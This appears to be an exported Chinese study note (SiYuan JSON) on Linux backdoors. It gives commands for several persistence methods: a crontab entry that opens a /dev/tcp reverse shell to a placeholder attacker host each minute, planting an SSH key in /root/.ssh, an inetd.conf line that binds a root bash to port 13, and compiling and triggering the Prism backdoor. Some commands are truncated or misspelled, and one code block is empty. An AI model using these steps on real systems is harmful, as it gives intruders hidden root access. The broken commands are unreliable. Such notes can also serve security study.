{"ID":"20241031140942-jzwbwp6","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241031140942-jzwbwp6","title":"Linux后门","updated":"20241031153437"},"Children":[{"ID":"20241031140942-hgxe4g9","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031140942-hgxe4g9","updated":"20241031141032"},"Children":[{"Type":"NodeText","Data":"计划任务后门crontab"}]},{"ID":"20241031152327-6ouql9p","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031152327-6ouql9p","updated":"20241031152414"},"Children":[{"ID":"20241031152324-iq0amys","Type":"NodeParagraph","Properties":{"id":"20241031152324-iq0amys","updated":"20241031152410"},"Children":[{"Type":"NodeText","Data":"Crontab 命令被用来"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"提交和管理"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"用户的需要"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"周期性执行的任务"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，与windows下的计划任务类似\n当安装完成操作系统后，默认会安装此服务工具，并且会"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自动启动 crond 进程"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，crond 进程"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"每分钟"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"会定期检査是否有要执行的任务，如果有要"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行的任务"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，则"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自动"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"执行该任务"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031152414-fgr2jch","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152414-fgr2jch","updated":"20241031152418"},"Children":[{"Type":"NodeText","Data":"相关命令"}]},{"ID":"20241031152420-9q3a1rh","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152420-9q3a1rh","updated":"20241031152459"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"crontab [-u user] -e :编辑某个用户的crontab文件内容\ncrontab [-u user] -1 :显示某个用户的crontab文件内容\ncrontab [-u user] -[i]r :从/var/spool/cron目录中删除某个用户的crontab文件，-i参数指定在删除用户的crontab文件时是否有确认提示\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031152511-ad058l9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031152511-ad058l9","updated":"20241031152517"},"Children":[{"Type":"NodeText","Data":"语法"}]},{"ID":"20241031152512-mih8fi7","Type":"NodeTable","TableAligns":[0,0,0,0,0,0,0],"Properties":{"colgroup":"min-width: 60px;|min-width: 60px;|min-width: 60px;||||","fold":"1","heading-fold":"1","id":"20241031152512-mih8fi7","updated":"20241031152634"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"代表意义"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"分钟"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"小时"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"日期"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"月份"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"周"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"命令"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"范围"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-59"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-23"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"1-31"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"1-12"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-7"}]},{"Type":"NodeTableCell","Data":"td"}]}]},{"ID":"20241031152702-9u0346n","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152702-9u0346n","updated":"20241031152707"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031152714-azh58ov","Type":"NodeList","ListData":{"Typ":1},"Properties":{"fold":"1","heading-fold":"1","id":"20241031152714-azh58ov","updated":"20241031152747"},"Children":[{"ID":"20241031152714-v7v6u6x","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20241031152714-v7v6u6x"},"Children":[{"ID":"20241031152708-i5fbpwb","Type":"NodeParagraph","Properties":{"id":"20241031152708-i5fbpwb","updated":"20241031152722"},"Children":[{"Type":"NodeText","Data":"在攻击机中进行监听"}]},{"ID":"20241031152813-tgadg5v","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031152813-tgadg5v","updated":"20241031152941"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"nc -lvvp 监听端口号\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20241031152723-e8c4tt9","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20241031152723-e8c4tt9","updated":"20241031153150"},"Children":[{"ID":"20241031152723-8g2ok47","Type":"NodeParagraph","Properties":{"id":"20241031152723-8g2ok47","updated":"20241031152733"},"Children":[{"Type":"NodeText","Data":"目标机写入计划任务"}]},{"ID":"20241031152942-esw12ol","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031152942-esw12ol","updated":"20241031153150"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"crontab -e */1 * * * * bash -i \u003e \u0026 /dev/tcp/攻击机/端口 0\u003e\u00261\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20241031152733-24n00nq","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20241031152733-24n00nq","updated":"20241031152747"},"Children":[{"ID":"20241031152733-kvn4c8o","Type":"NodeParagraph","Properties":{"id":"20241031152733-kvn4c8o","updated":"20241031152747"},"Children":[{"Type":"NodeText","Data":"目标机自动执行后，攻击机获得反弹shell"}]}]}]},{"ID":"20241031141105-p9elc1j","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031141105-p9elc1j","updated":"20241031141447"},"Children":[{"Type":"NodeText","Data":"ssh公钥免密"}]},{"ID":"20241031153239-g6f67j1","Type":"NodeBlockquote","Properties":{"id":"20241031153239-g6f67j1","updated":"20241031153437"},"Children":[{"ID":"20241031153223-1l1t7th","Type":"NodeParagraph","Properties":{"id":"20241031153223-1l1t7th","updated":"20241031153255"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"公私钥原理"}]},{"ID":"20241031153257-uew1746","Type":"NodeParagraph","Properties":{"id":"20241031153257-uew1746","updated":"20241031153402"},"Children":[{"Type":"NodeText","Data":"公私钥同时生成，公钥用于加密，私钥用于解密。公钥外持私钥内持"}]},{"ID":"20241031153404-ll9ekpd","Type":"NodeParagraph","Properties":{"id":"20241031153404-ll9ekpd","updated":"20241031153437"},"Children":[{"Type":"NodeText","Data":"ssh服务中，只需公钥放在服务器A上，就可以通过通过私钥登录到服务器A中"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031141457-ejna6ht","Type":"NodeParagraph","Properties":{"id":"20241031141457-ejna6ht","updated":"20241031141513"},"Children":[{"Type":"NodeText","Data":"攻击机生成公钥/私钥对"}]},{"ID":"20241031141515-p2fe33y","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031141515-p2fe33y","updated":"20241031141521"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh-keygon\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031141542-726y012","Type":"NodeParagraph","Properties":{"id":"20241031141542-726y012","updated":"20241031141728"},"Children":[{"Type":"NodeText","Data":"将攻击机.ssh目录下的id_rsa.pub赋值到目标服务器的/root/.ssh"}]},{"ID":"20241031141733-8ls7kgf","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031141733-8ls7kgf","updated":"20241031141735"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031141736-h4p2d48","Type":"NodeParagraph","Properties":{"id":"20241031141736-h4p2d48"}},{"ID":"20241031142409-x2017sj","Type":"NodeParagraph","Properties":{"id":"20241031142409-x2017sj","updated":"20241031142409"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031142409-9xyqwzw.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031142810-wgr4ky9","Type":"NodeParagraph","Properties":{"id":"20241031142810-wgr4ky9"}},{"ID":"20241031141737-fx4wuip","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031141737-fx4wuip","updated":"20241031142806"},"Children":[{"Type":"NodeText","Data":"ssh软连接后门"}]},{"ID":"20241031141737-gciglwa","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141737-gciglwa"}},{"ID":"20241031141737-6k24784","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141737-6k24784","updated":"20241031144018"},"Children":[{"Type":"NodeText","Data":"创建软链接"}]},{"ID":"20241031144019-uq5vdv7","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031144019-uq5vdv7","updated":"20241031144137"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ln -sf  /usr/bin\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031144023-2fddr1z","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144023-2fddr1z","updated":"20241031144032"},"Children":[{"Type":"NodeText","Data":"设置监听端口"}]},{"ID":"20241031141738-lmklqba","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141738-lmklqba"}},{"ID":"20241031141738-sd82wrc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141738-sd82wrc"}},{"ID":"20241031141738-0j5il48","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141738-0j5il48"}},{"ID":"20241031144152-q61a2gc","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031144152-q61a2gc","updated":"20241031145001"},"Children":[{"Type":"NodeText","Data":"inetd/xined后门  inetd--13端口"}]},{"ID":"20241031144204-19x51pw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144204-19x51pw","updated":"20241031144219"},"Children":[{"Type":"NodeText","Data":"inetd后门制作"}]},{"ID":"20241031144220-5ip3yy1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144220-5ip3yy1","updated":"20241031144402"},"Children":[{"Type":"NodeText","Data":"向/etc/inetd.conf文件中加入一行：daytime stream tco nowait root /bin/bash bash -i"}]},{"ID":"20241031144300-vmq71sx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144300-vmq71sx","updated":"20241031145040"},"Children":[{"Type":"NodeText","Data":"开启inet 之后使用nc连接 端口13 nc -lvvp 13"}]},{"ID":"20241031144612-9cmx6v1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144612-9cmx6v1","updated":"20241031144857"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031144612-4d2sv0z.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"apt-get"}]},{"ID":"20241031145046-iojmq51","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031145046-iojmq51","updated":"20241031145051"},"Children":[{"Type":"NodeText","Data":"Prism后门"}]},{"ID":"20241031145620-vtxl0ng","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145620-vtxl0ng","updated":"20241031145627"},"Children":[{"Type":"NodeText","Data":"编译"}]},{"ID":"20241031145627-qib4aa3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145627-qib4aa3","updated":"20241031145649"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"gcc -DDETACH -Wall -s -o prism prism.c\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031145055-s059buk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145055-s059buk","updated":"20241031145111"},"Children":[{"Type":"NodeText","Data":"编译完成后，查看prism后门配置信息"}]},{"ID":"20241031145111-zrmw1ob","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145111-zrmw1ob","updated":"20241031145120"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"./prism lnf0\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031145121-k1784qn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031145121-k1784qn","updated":"20241031145219"},"Children":[{"Type":"NodeText","Data":"将该后门上传到目标机中，再以root用户运行sendPacket.py脚本"}]},{"ID":"20241031145219-tip0gnl","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031145219-tip0gnl","updated":"20241031150035"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"sudo python2 ./sendPacket.py 目标IP 密码 攻击机ip 端口\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}